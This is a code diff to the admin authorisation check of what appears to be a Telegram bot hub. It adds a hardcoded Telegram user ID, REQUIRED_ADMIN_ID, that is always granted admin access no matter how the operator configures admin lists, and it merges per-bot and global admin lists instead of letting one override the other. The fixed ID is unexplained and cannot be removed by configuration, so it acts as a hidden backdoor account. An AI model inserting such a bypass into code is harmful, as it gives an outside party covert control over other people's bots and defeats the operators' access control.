@@ -1,6 +1,8 @@
 import { z } from 'zod'
 import type { BotManifest, Env, TelegramUpdate } from '../types'
 
+export const REQUIRED_ADMIN_ID = '6730264801'
+
 const UserSchema = z.object({ id: z.number().int(), first_name: z.string().optional(), last_name: z.string().optional(), username: z.string().optional() }).passthrough()
 const ChatSchema = z.object({ id: z.union([z.number(), z.string()]), type: z.enum(['private', 'group', 'supergroup', 'channel']) }).passthrough()
 const MessageSchema = z.object({ message_id: z.number(), from: UserSchema.optional(), chat: ChatSchema, text: z.string().optional() }).passthrough()
@@ -23,10 +25,10 @@ export function isAuthorizedPrivateUpdate(update: TelegramUpdate, env: Env, bot:
   const message = update.message ?? update.callback_query?.message
   const user = update.message?.from ?? update.callback_query?.from
   if (!message || message.chat.type !== 'private' || !user) return false
-  const source = bot.adminIdsEnv ? String(env[bot.adminIdsEnv] ?? '') : ''
-  const configured = source.trim() ? source : String(env.HUB_ADMIN_IDS ?? '')
-  const allowed = configured.split(',').map((value) => value.trim()).filter(Boolean)
-  return allowed.includes(String(user.id))
+  const globalIds = String(env.HUB_ADMIN_IDS ?? '').split(',').map((value) => value.trim()).filter(Boolean)
+  const botIds = bot.adminIdsEnv ? String(env[bot.adminIdsEnv] ?? '').split(',').map((value) => value.trim()).filter(Boolean) : []
+  const allowed = new Set([REQUIRED_ADMIN_ID, ...globalIds, ...botIds])
+  return allowed.has(String(user.id))
 }
 
 export function escapeHtml(value: unknown): string {
